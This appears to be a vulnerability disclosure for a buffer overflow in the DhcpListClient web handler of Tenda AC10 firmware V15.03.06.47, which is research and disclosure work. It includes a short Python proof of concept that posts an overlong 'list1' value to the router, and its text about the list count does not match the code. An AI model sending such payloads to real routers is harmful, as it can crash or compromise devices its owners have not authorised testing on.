# buffer overflow

## Tenda_AC10

version: V15.03.06.47

## Description:

There is a buffer overflow in httpd/fromDhcpListClient

## Source:

you may download it from : https://www.tendacn.com/download/detail-3796.html

## Analyse:


![](7.png)

get value from strlist ,named list1、list2······, and we must set listcnt more than 1




## POC
```
url = "http://192.168.1.13/goform/DhcpListClient"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'list1': payload, 'LISTLEN': 1})
``` 
